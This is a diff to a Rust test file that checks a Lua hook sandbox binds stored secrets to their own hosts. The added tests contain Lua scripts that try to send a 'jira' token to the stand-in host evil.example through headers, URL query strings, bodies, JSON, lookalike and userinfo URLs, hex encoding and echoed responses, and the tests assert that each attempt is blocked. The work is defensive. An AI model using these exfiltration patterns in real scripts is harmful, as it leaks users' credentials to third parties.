@@ -8,7 +8,7 @@
 )]
 #![cfg(feature = "lua")]
 //! What a script may do with the network and secrets, against a fake host: the allowlist it declares itself, https, the
-//! request limits, a secret's value kept out of everything the script prints or returns, and a script that waits on a
+//! request limits, a secret's value going only to the hosts it was saved with and never into the script, and a script that waits on a
 //! request while another call arrives.
 
 use async_trait::async_trait;
@@ -20,6 +20,7 @@ use std::pin::Pin;
 use std::rc::Rc;
 use std::task::{Context, Poll};
 use tc_core::dates::Clock;
+use tc_core::hook_secrets::Secret;
 use tc_core::hooks::task_to_json;
 use tc_core::lua_hooks::{HttpRequest, HttpResponse, LuaRunner, Net};
 use tc_core::model::Facts;
@@ -43,7 +44,7 @@ type Answer = Box<dyn Fn(&HttpRequest) -> Result<HttpResponse, String>>;
 
 struct FakeNet {
     seen: RefCell<Vec<HttpRequest>>,
-    secrets: HashMap<String, String>,
+    secrets: HashMap<String, Secret>,
     answer: Answer,
 }
 
@@ -51,7 +52,22 @@ impl FakeNet {
     fn new(answer: impl Fn(&HttpRequest) -> Result<HttpResponse, String> + 'static) -> Rc<FakeNet> {
         Rc::new(FakeNet {
             seen: RefCell::default(),
-            secrets: HashMap::from([("jira".to_owned(), "s3cr3t-token".to_owned())]),
+            secrets: HashMap::from([
+                (
+                    "jira".to_owned(),
+                    Secret {
+                        value: "s3cr3t-token".into(),
+                        hosts: vec!["acme.atlassian.net".into(), "*.atlassian.com".into()],
+                    },
+                ),
+                (
+                    "old".to_owned(),
+                    Secret {
+                        value: "0ld-s3cr3t".into(),
+                        hosts: vec![],
+                    },
+                ),
+            ]),
             answer: Box::new(answer),
         })
     }
@@ -66,7 +82,7 @@ impl Net for FakeNet {
         answer
     }
 
-    async fn secret(&self, name: &str) -> Result<Option<String>, String> {
+    async fn secret(&self, name: &str) -> Result<Option<Secret>, String> {
         Ok(self.secrets.get(name).cloned())
     }
 }
@@ -137,7 +153,7 @@ async fn a_script_posts_json_with_a_secret_and_uses_what_comes_back() {
 }
 
 #[tokio::test(flavor = "current_thread")]
-async fn a_secrets_value_is_kept_out_of_what_the_script_prints_returns_and_fails_with() {
+async fn a_script_holds_a_stand_in_never_the_value() {
     let net = FakeNet::new(|_| ok_json(json!({})));
     let r = runner(
         r#"
@@ -154,11 +170,11 @@ async fn a_secrets_value_is_kept_out_of_what_the_script_prints_returns_and_fails
         Some(net),
     );
     let got = r.call("on_add", &[task()]).await.unwrap();
-    assert_eq!(got.lines[0].text, "token is ***");
-    assert_eq!(got.value["description"], "leak: ***");
-    assert_eq!(got.value["uda"]["jira"], "***");
+    assert_eq!(got.lines[0].text, "token is ⟦secret:jira⟧");
+    assert_eq!(got.value["description"], "leak: ⟦secret:jira⟧");
+    assert_eq!(got.value["uda"]["jira"], "⟦secret:jira⟧");
     let failed = r.call("on_modify", &[task(), task()]).await.unwrap_err();
-    assert_eq!(failed.message, "it broke with ***");
+    assert_eq!(failed.message, "it broke with ⟦secret:jira⟧");
     assert!(!format!("{failed:?}").contains("s3cr3t"));
 }
 
@@ -334,5 +350,158 @@ async fn a_second_call_while_one_waits_on_the_network_is_told_to_use_another_run
     assert_eq!(
         r.call("on_launch", &[json!("c")]).await.unwrap().lines[0].text,
         "done c"
+    );
+}
+
+/// Every request the fake host saw, as one text, to look for a value in.
+fn everything_sent(net: &FakeNet) -> String {
+    format!("{:?}", net.seen.borrow())
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn a_secret_goes_only_to_its_own_hosts_whatever_the_script_allows() {
+    let net = FakeNet::new(|_| ok_json(json!({})));
+    let r = runner(
+        r#"
+        allow_hosts{"evil.example", "acme.atlassian.net", "*.atlassian.com", "*.atlassian.net"}
+        function on_launch(how)
+          local s = secret("jira")
+          if how == "header" then http.get("https://evil.example/", { headers = { Authorization = "Bearer " .. s } })
+          elseif how == "url" then http.get("https://evil.example/?t=" .. s)
+          elseif how == "body" then http.post("https://evil.example/", { body = "t=" .. s })
+          elseif how == "json" then http.post("https://evil.example/", { json = { t = s } })
+          elseif how == "lookalike" then http.get("https://evil-acme.atlassian.net/", { headers = { A = s } })
+          elseif how == "userinfo" then http.get("https://acme.atlassian.net@evil.example/", { headers = { A = s } })
+          elseif how == "in-host" then http.get("https://" .. s .. ".atlassian.com/")
+          elseif how == "wildcard" then http.get("https://eu.atlassian.com/", { headers = { A = s } })
+          elseif how == "own" then http.get("https://acme.atlassian.net/?t=" .. s, { body = s, headers = { A = s } })
+          end
+        end
+        "#,
+        Some(net.clone()),
+    );
+    for how in ["header", "url", "body", "json", "lookalike", "userinfo", "in-host"] {
+        let failed = r.call("on_launch", &[json!(how)]).await.unwrap_err();
+        assert!(!failed.message.contains("s3cr3t"), "{how}: {}", failed.message);
+    }
+    assert!(!everything_sent(&net).contains("s3cr3t"), "{}", everything_sent(&net));
+    assert!(net.seen.borrow().is_empty());
+    let failed = r.call("on_launch", &[json!("header")]).await.unwrap_err();
+    assert_eq!(
+        failed.message,
+        "jira may only be sent to acme.atlassian.net, *.atlassian.com, not evil.example"
+    );
+
+    // To one of its hosts, the value goes in the address, a header and the body.
+    r.call("on_launch", &[json!("wildcard")]).await.unwrap();
+    r.call("on_launch", &[json!("own")]).await.unwrap();
+    let seen = net.seen.borrow();
+    assert_eq!(seen[0].headers, [("A".to_owned(), "s3cr3t-token".to_owned())]);
+    assert_eq!(seen[1].url, "https://acme.atlassian.net/?t=s3cr3t-token");
+    assert_eq!(seen[1].body.as_deref(), Some("s3cr3t-token"));
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn encoding_or_cutting_a_stand_in_gives_nothing_away() {
+    let net = FakeNet::new(|_| ok_json(json!({})));
+    let r = runner(
+        r#"
+        allow_hosts{"evil.example"}
+        function on_add(task)
+          local s = secret("jira")
+          local hex = s:gsub(".", function(c) return string.format("%02x", c:byte()) end)
+          http.post("https://evil.example/", { json = { hex = hex, part = s:sub(1, 3), len = #s } })
+          task.description = hex
+          return task
+        end
+        "#,
+        Some(net.clone()),
+    );
+    let got = r.call("on_add", &[task()]).await.unwrap();
+    let sent = everything_sent(&net);
+    assert!(!sent.contains("s3cr3t"), "{sent}");
+    let hex_of_value: String = "s3cr3t-token".bytes().map(|b| format!("{b:02x}")).collect();
+    assert!(!sent.contains(&hex_of_value));
+    assert!(!got.value.to_string().contains(&hex_of_value));
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn a_response_that_echoes_the_value_gives_the_stand_in() {
+    let net = FakeNet::new(|req| {
+        let auth = req
+            .headers
+            .iter()
+            .find(|(k, _)| k == "A")
+            .map(|(_, v)| v.clone())
+            .unwrap_or_default();
+        Ok(HttpResponse {
+            status: 200,
+            headers: vec![("x-echo".into(), auth.clone())],
+            body: json!({ "you_sent": auth }).to_string(),
+        })
+    });
+    let r = runner(
+        r#"
+        allow_hosts{"acme.atlassian.net", "evil.example"}
+        function on_add(task)
+          local res = http.get("https://acme.atlassian.net/echo", { headers = { A = secret("jira") } })
+          task.description = res.json.you_sent .. " " .. res.headers["x-echo"] .. " " .. res.body
+          say(task.description)
+          http.post("https://evil.example/", { body = task.description })
+        end
+        "#,
+        Some(net.clone()),
+    );
+    let failed = r.call("on_add", &[task()]).await.unwrap_err();
+    assert!(
+        failed.lines[0].text.starts_with("⟦secret:jira⟧ ⟦secret:jira⟧"),
+        "{:?}",
+        failed.lines
+    );
+    // Sending on what came back sends the stand-in, which names jira, which may not go there.
+    assert!(
+        failed.message.contains("jira may only be sent to"),
+        "{}",
+        failed.message
+    );
+    assert_eq!(net.seen.borrow().len(), 1);
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn a_secret_saved_before_hosts_existed_goes_nowhere_and_says_why() {
+    let net = FakeNet::new(|_| ok_json(json!({})));
+    let r = runner(
+        r#"
+        allow_hosts{"acme.atlassian.net"}
+        function on_add(task) http.get("https://acme.atlassian.net/", { headers = { A = secret("old") } }) end
+        "#,
+        Some(net.clone()),
+    );
+    let failed = r.call("on_add", &[task()]).await.unwrap_err();
+    assert!(
+        failed.message.contains("old can't be sent anywhere yet"),
+        "{}",
+        failed.message
+    );
+    assert!(net.seen.borrow().is_empty());
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn a_failed_request_does_not_echo_the_value_either() {
+    let net = FakeNet::new(|req| Err(format!("could not reach {}", req.url)));
+    let r = runner(
+        r#"
+        allow_hosts{"acme.atlassian.net"}
+        function on_add(task)
+          local res, why = http.get("https://acme.atlassian.net/?t=" .. secret("jira"))
+          say(why)
+        end
+        "#,
+        Some(net),
+    );
+    let got = r.call("on_add", &[task()]).await.unwrap();
+    assert_eq!(
+        got.lines[0].text,
+        "could not reach https://acme.atlassian.net/?t=⟦secret:jira⟧"
     );
 }
